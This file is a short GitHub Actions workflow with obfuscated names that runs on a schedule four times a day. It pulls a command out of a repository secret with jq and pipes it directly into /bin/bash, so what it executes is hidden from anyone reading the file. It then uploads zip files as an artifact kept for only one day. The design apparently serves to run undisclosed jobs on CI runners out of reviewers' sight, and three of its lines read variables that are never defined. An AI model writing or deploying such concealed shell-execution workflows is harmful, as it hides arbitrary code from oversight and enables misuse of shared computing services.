name: lvjinyiwu
on:
  workflow_dispatch:

  schedule:
    - cron: '46 3,9,15,21 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: lvjinyiwu
        env:
          r8: ${{ secrets.r8 }}
        run: |
          printf '%s' "$r8" | jq -r .u429 | /bin/bash
          echo $arfm011 | jq -r .vrl920 | /bin/bash
          echo $anoje30071 | jq -r .scuo9216 | /bin/bash
          printf '%s' "$bfn98" | jq -r .qgrzf59988 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: sFnTBy3O
          path: "*.zip"
          retention-days: 1
